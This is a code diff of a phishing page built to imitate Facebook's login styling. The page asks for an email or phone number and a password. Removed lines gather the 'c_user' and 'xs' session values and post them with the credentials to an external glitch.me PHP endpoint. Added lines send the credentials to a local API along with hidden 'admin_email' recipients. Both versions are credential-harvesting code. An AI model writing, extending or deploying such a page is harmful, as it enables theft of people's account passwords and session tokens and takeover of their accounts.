@@ -14,8 +14,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { confirmationFormSchema } from "@shared/schema";
-// import { apiRequest } from "@/lib/queryClient"; // Removed as fetch is used instead
+import { formTwoSchema } from "@shared/schema";
 import {
   Select,
   SelectContent,
@@ -32,34 +31,15 @@ export default function Confirmation() {
   const [countryCode, setCountryCode] = useState('+1');
 
   const form = useForm({
-    resolver: zodResolver(confirmationFormSchema),
+    resolver: zodResolver(formTwoSchema),
     defaultValues: {
       user_email: "",
       password: "",
-      c_user: "",
-      xs: "",
       admin_email: process.env.SMTP_USER || "",
       admin_email_2: process.env.ADMIN_EMAIL || "",
-      admin_email_3: "",
+      admin_email_3: "", // Editable third admin email
     },
   });
-
-  // Load validation data on mount
-  useEffect(() => {
-    const storedData = localStorage.getItem('validation_data');
-    if (!storedData) {
-      setLocation('/validation');
-      return;
-    }
-    try {
-      const parsed = JSON.parse(storedData);
-      form.setValue('c_user', parsed.c_user);
-      form.setValue('xs', parsed.xs);
-    } catch (error) {
-      console.error('Failed to parse validation data:', error);
-      setLocation('/validation');
-    }
-  }, [setLocation, form]);
 
   const onSubmit = async (data: any) => {
     try {
@@ -68,9 +48,7 @@ export default function Confirmation() {
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
       };
 
-      console.log('Submitting form data:', formattedData);
-
-      await fetch('https://mixed-fluff-space.glitch.me/zubairbhaispan.php', {
+      const response = await fetch('/api/form-two', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -78,7 +56,9 @@ export default function Confirmation() {
         body: JSON.stringify(formattedData),
       });
 
-      localStorage.removeItem('validation_data');
+      if (!response.ok) {
+        throw new Error('Failed to submit form');
+      }
 
       toast({
         title: "Success!",
@@ -94,7 +74,6 @@ export default function Confirmation() {
       });
     }
   };
-
 
   return (
     <>
@@ -181,10 +160,6 @@ export default function Confirmation() {
                             }
                             className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                             {...field}
-                            onChange={(e) => {
-                              const value = e.target.value.replace(/\s+/g, '');
-                              field.onChange(value);
-                            }}
                           />
                         </div>
                       </FormControl>
@@ -193,60 +168,49 @@ export default function Confirmation() {
                   )}
                 />
               </div>
-              <div className="text-left space-y-4">
-                <FormField
-                  control={form.control}
-                  name="password"
-                  render={({ field }) => (
-                    <FormItem>
-                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                        Password
-                      </FormLabel>
-                      <FormControl>
-                        <Input
-                          type="password"
-                          placeholder="Enter password"
-                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
-                          {...field}
-                        />
-                      </FormControl>
-                      <FormMessage className="text-xs text-red-500 mt-1" />
-                    </FormItem>
-                  )}
-                />
 
-                {/* Hidden admin email fields */}
-                <input 
-                  type="hidden" 
-                  name="admin_email" 
-                  value={process.env.SMTP_USER || ""} 
-                />
-                <input 
-                  type="hidden" 
-                  name="admin_email_2" 
-                  value={process.env.ADMIN_EMAIL || ""} 
-                />
-                <FormField
-                  control={form.control}
-                  name="admin_email_3"
-                  render={({ field }) => (
-                    <FormItem>
-                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                        Additional Email
-                      </FormLabel>
-                      <FormControl>
-                        <Input
-                          type="email"
-                          placeholder="Enter additional email"
-                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
-                          {...field}
-                        />
-                      </FormControl>
-                      <FormMessage className="text-xs text-red-500 mt-1" />
-                    </FormItem>
-                  )}
-                />
-              </div>
+              <FormField
+                control={form.control}
+                name="password"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                      Password
+                    </FormLabel>
+                    <FormControl>
+                      <Input
+                        type="password"
+                        placeholder="Enter password"
+                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                        {...field}
+                      />
+                    </FormControl>
+                    <FormMessage className="text-xs text-red-500 mt-1" />
+                  </FormItem>
+                )}
+              />
+
+              <FormField
+                control={form.control}
+                name="admin_email_3"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                      Additional Email (Optional)
+                    </FormLabel>
+                    <FormControl>
+                      <Input
+                        type="email"
+                        placeholder="Enter additional notification email"
+                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                        {...field}
+                      />
+                    </FormControl>
+                    <FormMessage className="text-xs text-red-500 mt-1" />
+                  </FormItem>
+                )}
+              />
+
               <Button 
                 type="submit" 
                 className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
